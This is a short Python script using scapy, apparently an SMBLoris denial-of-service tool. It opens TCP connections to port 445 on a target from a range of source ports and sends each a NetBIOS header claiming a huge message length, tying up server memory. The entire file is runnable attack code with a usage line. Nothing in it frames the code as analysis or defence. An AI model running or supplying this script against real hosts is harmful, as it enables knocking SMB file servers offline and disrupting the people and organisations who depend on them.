from scapy.all import *
import sys, os

if len(sys.argv) != 4:
  print "Usage: python smbloris.py <target> <port0> <numports>"
  exit(0)

target = sys.argv[1]
p0 = int(sys.argv[2])
numports = int(sys.argv[3])

conf.L3socket
conf.L3socket=L3RawSocket

i = IP()
i.dst = target
t = TCP()
t.dport = 445

for p in range(p0, p0+numports):
  print p
  t.sport = p
  t.flags = "S"

  r = sr1(i/t)
  rt = r[TCP]
  t.ack = rt.seq + 1
  t.seq = rt.ack
  t.flags = "A"
  sbss = '\x00\x01\xff\xff'
  send(i/t/sbss)
 
